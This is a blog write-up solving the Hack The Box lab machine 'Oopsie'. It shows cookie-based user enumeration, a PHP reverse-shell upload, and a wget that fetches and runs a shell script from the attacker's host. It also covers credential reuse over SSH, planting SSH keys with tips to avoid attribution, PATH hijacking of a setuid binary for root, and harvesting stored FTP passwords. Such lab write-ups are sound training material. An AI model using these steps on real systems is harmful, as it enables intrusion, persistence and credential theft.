---
title: "Hack The Box write-up: Oopsie"
date: 2020-11-19T16:03:41-07:00
hero: /images/posts/security/htb-oopsie/banner.svg
description: A write-up for solving Oopsie on hackthebox.eu
theme: Toha
author:
  name: Chuck Valenza
  image: /images/avatar.svg
menu:
  sidebar:
    name: "HTB: Oopsie"
    identifier: htb-oopsie
    parent: security
    weight: 500
---

This is a write-up for the "Oopsie" box on [hackthebox.eu](https://www.hackthebox.eu/).
It's the second machine in their "Starting Point" series. Hackthebox has a
write-up on each of these machines, but they are more geared towards helping
you if you're stuck rather than explaining the thought process of how to come
up with the solution. Hopefully, I can achieve this with my write-ups.

## Scanning

Scanning reveals that this machine is a linux server running an ssh and apache
server.

```
$ sudo nmap -sS -A -T4 -p- --min-rate=1000 10.10.10.28
Starting Nmap 7.91 ( https://nmap.org ) at 2020-10-28 21:32 MST
Nmap scan report for 10.10.10.28
Host is up (0.16s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=10/28%OT=22%CT=1%CU=37102%PV=Y%DS=2%DC=T%G=Y%TM=5F9A46
OS:33%P=x86_64-pc-linux-gnu)SEQ(SP=109%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
OS:11NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   206.50 ms 10.10.14.1
2   206.66 ms 10.10.10.28

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/
Nmap done: 1 IP address (1 host up) scanned in 93.92 seconds
```

{{< vs 2 >}}

## Enumeration

Looks like its running ssh and an Apache server. Let's pull up the web page in Firefox.

{{< vs 2 >}}

{{< img src="/images/posts/security/htb-oopsie/landing-page.png" width="900" align="center">}}

{{< vs 3 >}}

None of the links seem to resolve to anything and there doesn't appear to be
any input boxes on the page. Pulling up inspect, we see inline scripts and
styling, and links to a few scripts. One sticks out as interesting: `login.js`.
Unfortunately, this doesn't resolve to anything, but the directory does!

{{< vs 3 >}}

{{< img src="/images/posts/security/htb-oopsie/login-page.png" width="900" align="center">}}

{{< vs 3 >}}

## Gaining a foothold

We're able to get in using the `admin` and `MEGACORP_4dm1n!!` credentials we got on the [last box](posts/security/htb-archetype/).

Poking around the site, we see that there is an account page, but it only lists
ours. Notable cookies are the 'user' and 'role' tokens. When loading the "Uploads"
section, we see that it requires 'super admin' rights. Unfortunately, changing the
role cookie alone does not seem to get us anywhere. We've got to find a user id
with super admin rights. Let's write a quick one-liner to enumerate some of the
available users using curl:

```
for i in {1..100}; do echo "===" $i "==="; curl -s -b "user=34322; role=admin" "http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&id="$i | grep --color=no -i email | sed -e 's/<[^>]*>/ /g;s/Access ID  Name//g;s/Email//g;s/^[ ]*//;s/[ ]*$//'; done
```

{{< vs 1 >}}

This will come up with a few accounts, but the one that jumps out is the super admin:

```
=== 30 ===
86575  super admin  superadmin@megacorp.com
```

{{< vs 1 >}}

Firing up burp and navigating to the 'uploads' with these cookies shows us a new
page:

{{< vs 3 >}}

{{< img src="/images/posts/security/htb-oopsie/upload-page.png" width="900" align="center">}}

{{< vs 3 >}}

Here, we can now upload our reverse php shell and execute it by navigating to
`http://10.10.10.28/uploads/r.php`. Make sure the listener is up before you
navigate to the page or you'll have to re-do the process.

Now that we have a shell, a quick `whoami` will show that we are running as www-data.
After a little poking around, I can't find a writeable directory aside from /tmp, so
I'll have to use that as my working directory to upgrade this shell to something a
little more usable. I fire up a python server listening to 9002 on my laptop to
get the shell onto the machine, then subsequently start my nc listener to listen
on 9002. The while loop allows us to reconnect at any time by firing up a nc
listener on 9002, provided we still have the same IP address.

```
cd /tmp; wget http://10.10.14.48:9002/r3.py
while :; do /usr/bin/python3 ./r3.py -t 10.10.14.48 -p 9002; done &
```

{{< vs 1 >}}

Looking through the website's files, we see that there are a few new php files
to look at.

```
$ find /var/www/html
/var/www/html
/var/www/html/index.php
/var/www/html/images
/var/www/html/images/1.jpg
/var/www/html/images/3.jpg
/var/www/html/images/2.jpg
/var/www/html/js
/var/www/html/js/jquery.min.js
/var/www/html/js/bootstrap.min.js
/var/www/html/js/min.js
/var/www/html/js/prefixfree.min.js
/var/www/html/js/index.js
/var/www/html/themes
/var/www/html/themes/theme.css
/var/www/html/uploads
/var/www/html/css
/var/www/html/css/1.css
/var/www/html/css/ionicons.min.css
/var/www/html/css/reset.min.css
/var/www/html/css/bootstrap.min.css
/var/www/html/css/font-awesome.min.css
/var/www/html/css/normalize.min.css
/var/www/html/css/new.css
/var/www/html/cdn-cgi
/var/www/html/cdn-cgi/login
/var/www/html/cdn-cgi/login/index.php
/var/www/html/cdn-cgi/login/admin.php
/var/www/html/cdn-cgi/login/script.js
/var/www/html/cdn-cgi/login/db.php
/var/www/html/fonts
/var/www/html/fonts/fontawesome-webfont.ttf
```

{{< vs 1 >}}

It will be easieer and quieter to dig through these files on our local system.
Tar up the directory into /tmp/html.tar, then set up a python http server on
the server. From here, we can wget the tarball to our local machine and dig
through it.

{{< vs 2 >}}

## Moving laterally

Digging through the files, we find mysql credentials for the `robert` user in
`db.php`.

```
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

{{< vs 1 >}}

As users often use the same password for multiple things, we'll see if he has
recycled his user password in the mysql connection. SSH-ing in as robert with
the newly acquired password works and we'll get our user pwn.

```
[ cvalenza@kali ] tmp $ ssh robert@10.10.10.28
robert@10.10.10.28's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Nov  9 18:00:46 UTC 2020

  System load:  0.99               Processes:             174
  Usage of /:   26.5% of 19.56GB   Users logged in:       0
  Memory usage: 43%                IP address for ens160: 10.10.10.28
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.


Last login: Mon Nov  9 03:25:00 2020 from 10.10.14.75
robert@oopsie:~$ cat user.txt 
```

{{< vs 2 >}}

## Solidifying our foothold

Now that we have the user login, let's make sure we still have access to the
user if he changes his password. To do this, we can just add our public ssh key
to the user's authorized_keys. Make sure you remove the key's comment (often
user@host) to avoid attribution.

{{< vs 2 >}}

## Privilege escalation

Now that we have the robert user, let's see what permissions he has and if he
has stored anything interesting on this machine.

```
robert@oopsie:~$ sudo -l
[sudo] password for robert: 
Sorry, user robert may not run sudo on oopsie.
robert@oopsie:~$ groups
robert bugtracker
robert@oopsie:~$ locate bugtracker
/usr/bin/bugtracker
```

{{< vs 1 >}}

```
robert@oopsie:~$ find / -user robert 2>&1 | grep -v "denied\|run\|proc"
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/tasks
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope/tasks
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope/notify_on_release
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.clone_children
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/cgroup.clone_children
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/cgroup.threads
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.events
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.max.descendants
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cpu.stat
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.type
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.stat
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.threads
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.controllers
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.subtree_control
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.max.depth
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/cgroup.subtree_control
/home/robert
/home/robert/.cache
/home/robert/.cache/motd.legal-displayed
/home/robert/cat
/home/robert/.mysql_history
/home/robert/.python_history
/home/robert/user.txt
/home/robert/.bashrc
/home/robert/.ssh
/home/robert/.ssh/authorized_keys
/home/robert/.local
/home/robert/.local/share
/home/robert/.local/share/nano
/home/robert/.lesshst
/home/robert/.profile
/home/robert/.bash_logout
/home/robert/.bash_history
/home/robert/.gnupg
/home/robert/.gnupg/private-keys-v1.d
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/tasks
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/cgroup.clone_children
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/tasks
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/notify_on_release
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.clone_children
/dev/pts/10
```

{{< vs 1 >}}

```
robert@oopsie:~$ cat .mysql_history
_HiStOrY_V2_
show\040databases;
use\040mysql
show\040tables;
select\040*\040from\040user;
select\040User,authentication_string\040from\040users;
select\040*\040from\040users;
show\040tables;
select\040User,authentication_string\040from\040user;
```

{{< vs 1 >}}

The user doesn't have any useful sudo rights, although we do see that the user
is a part of the bugtracker group. It looks like `bugtracker` is a program.

When we run it, it appears to be a command line bug tracking system. It has the
`setuid` bit set and it is owned bu `root`, meaning that when executed, it gets
run by the root user. Let's see what bugs they have documented in the system to
hopefully reveal some flaws in their system. I used a short loop to dump all the
bugs.

```
robert@oopsie:~$ for i in {1..5}; do echo $i | bugtracker; done

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: ---------------

Binary package hint: ev-engine-lib

Version: 3.3.3-1

Reproduce:
When loading library in firmware it seems to be crashed

What you expected to happen:
Synchronized browsing to be enabled since it is enabled for that site.

What happened instead:
Synchronized browsing is disabled. Even choosing VIEW > SYNCHRONIZED BROWSING from menu does not stay enabled between connects.


------------------
: EV Bug Tracker :
------------------

Provide Bug ID: ---------------

If you connect to a site filezilla will remember the host, the username and the password (optional). The same is true for the site manager. But if a port other than 21 is used the port is saved in .config/filezilla - but the information from this file isn't downloaded again afterwards.

ProblemType: Bug
DistroRelease: Ubuntu 16.10
Package: filezilla 3.15.0.2-1ubuntu1
Uname: Linux 4.5.0-040500rc7-generic x86_64
ApportVersion: 2.20.1-0ubuntu3
Architecture: amd64
CurrentDesktop: Unity
Date: Sat May 7 16:58:57 2016
EcryptfsInUse: Yes
SourcePackage: filezilla
UpgradeStatus: No upgrade log present (probably fresh install)


------------------
: EV Bug Tracker :
------------------

Provide Bug ID: ---------------

Hello,

When transferring files from an FTP server (TLS or not) to an SMB share, Filezilla keeps freezing which leads down to very much slower transfers ...

Looking at resources usage, the gvfs-smb process works hard (60% cpu usage on my I7)

I don't have such an issue or any slowdown when using other apps over the same SMB shares.

ProblemType: Bug
DistroRelease: Ubuntu 12.04
Package: filezilla 3.5.3-1ubuntu2
ProcVersionSignature: Ubuntu 3.2.0-25.40-generic 3.2.18
Uname: Linux 3.2.0-25-generic x86_64
NonfreeKernelModules: nvidia
ApportVersion: 2.0.1-0ubuntu8
Architecture: amd64
Date: Sun Jul 1 19:06:31 2012
EcryptfsInUse: Yes
InstallationMedia: Ubuntu 12.04 LTS "Precise Pangolin" - Alpha amd64 (20120316)
ProcEnviron:
 TERM=xterm
 PATH=(custom, user)
 LANG=fr_FR.UTF-8
 SHELL=/bin/bash
SourcePackage: filezilla
UpgradeStatus: No upgrade log present (probably fresh install)
---
ApportVersion: 2.13.3-0ubuntu1
Architecture: amd64
DistroRelease: Ubuntu 14.04
EcryptfsInUse: Yes
InstallationDate: Installed on 2013-02-23 (395 days ago)
InstallationMedia: Ubuntu 12.10 "Quantal Quetzal" - Release amd64 (20121017.5)
Package: gvfs
PackageArchitecture: amd64
ProcEnviron:
 LANGUAGE=fr_FR
 TERM=xterm
 PATH=(custom, no user)
 LANG=fr_FR.UTF-8
 SHELL=/bin/bash
ProcVersionSignature: Ubuntu 3.13.0-19.40-generic 3.13.6
Tags: trusty
Uname: Linux 3.13.0-19-generic x86_64
UpgradeStatus: Upgraded to trusty on 2014-03-25 (0 days ago)
UserGroups:


------------------
: EV Bug Tracker :
------------------

Provide Bug ID: ---------------

cat: /root/reports/4: No such file or directory


------------------
: EV Bug Tracker :
------------------

Provide Bug ID: ---------------

cat: /root/reports/5: No such file or directory
```

{{< vs 1 >}}

It looks like there's only 3 bugs in the system. When it attempts to access a
bug id which is not in the system, it throws an error indicating that it executies
`cat` to drop the bug infromation. 

```
robert@oopsie:~$ strings /usr/bin/bugtracker
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
strcpy
__isoc99_scanf
__stack_chk_fail
putchar
printf
strlen
malloc
strcat
system
geteuid
__cxa_finalize
__libc_start_main
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
AWAVI
AUATL
[]A\A]A^A_
------------------
: EV Bug Tracker :
------------------
Provide Bug ID:
---------------
cat /root/reports/
;*3$"
GCC: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7697
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
test.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
putchar@@GLIBC_2.2.5
_ITM_deregisterTMCloneTable
strcpy@@GLIBC_2.2.5
_edata
strlen@@GLIBC_2.2.5
__stack_chk_fail@@GLIBC_2.4
system@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
concat
geteuid@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
malloc@@GLIBC_2.2.5
__bss_start
main
__isoc99_scanf@@GLIBC_2.7
strcat@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
```

{{< vs 1 >}}

When we run strings on the program, we see that it works by cat-ing the contents
of a file in root's directory, but doesn't use and explicit path for the `cat`
executable. This is a textbook set-up for PATH interception. This will drop us
a shell, executed as the `root` user, getting our system pwn.

```
robert@oopsie:~$ export PATH=/tmp:$PATH
robert@oopsie:~$ echo "/bin/bash" > /tmp/cat
robert@oopsie:~$ bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 1
---------------

root@oopsie:~# cd /root/
root@oopsie:/root# vim -O .ssh/authorized_keys /home/robert/.ssh/authorized_keys
```

{{< vs 1 >}}

```
[ cvalenza@kali ] ~ $ ssh root@10.10.10.28
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Nov 10 02:30:12 UTC 2020

  System load:  0.49               Processes:             184
  Usage of /:   26.6% of 19.56GB   Users logged in:       1
  Memory usage: 43%                IP address for ens160: 10.10.10.28
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Sep 11 11:51:24 2020
root@oopsie:~# cat root.txt
```

{{< vs 2 >}}

## Post exploitation

Now that we've pwned the root user, we should ensure we can get back in by adding
our ssh keys to the `authorized_keys` file in a similar fashion to the `robert`
user. We'll dig around the root directory to see if there's anything else notable
before moving on.

```
root@oopsie:~# find .
.
./.cache
./.cache/motd.legal-displayed
./root.txt
./.bashrc
./.ssh
./.ssh/authorized_keys
./reports
./reports/1
./reports/2
./reports/3
./.local
./.local/share
./.local/share/nano
./.local/share/nano/search_history
./.profile
./.bash_history
./.viminfo
./.config
./.config/filezilla
./.config/filezilla/filezilla.xml
./.gnupg
./.gnupg/private-keys-v1.d
```

{{< vs 1 >}}

One thing noteworthy here is a user/pass in a filezilla configuration file

```
root@oopsie:~# cat ./.config/filezilla/filezilla.xml
<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
<FileZilla3>
    <RecentServers>
        <Server>
            <Host>10.10.10.46</Host>
            <Port>21</Port>
            <Protocol>0</Protocol>
            <Type>0</Type>
            <User>ftpuser</User>
            <Pass>mc@F1l3ZilL4</Pass>
            <Logontype>1</Logontype>
            <TimezoneOffset>0</TimezoneOffset>
            <PasvMode>MODE_DEFAULT</PasvMode>
            <MaximumMultipleConnections>0</MaximumMultipleConnections>
            <EncodingType>Auto</EncodingType>
            <BypassProxy>0</BypassProxy>
        </Server>
    </RecentServers>
</FileZilla3>
```

